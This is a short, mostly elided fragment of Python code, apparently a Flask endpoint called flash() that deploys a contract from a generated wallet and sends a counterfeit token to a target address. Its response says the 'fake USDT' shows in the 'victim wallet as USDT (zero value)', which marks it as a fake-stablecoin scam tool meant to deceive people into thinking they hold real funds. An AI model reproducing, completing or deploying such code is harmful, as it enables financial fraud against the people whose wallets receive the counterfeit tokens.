...
# Deployer wallet (from gen_wallet.py)
...
def flash():
    try:
        ...
        return jsonify({"status":"success","contract":rcpt.contractAddress,"victim_balance":amount/10**18,"note":"Fake USDT sent. Shows in victim wallet as USDT (zero value)."})
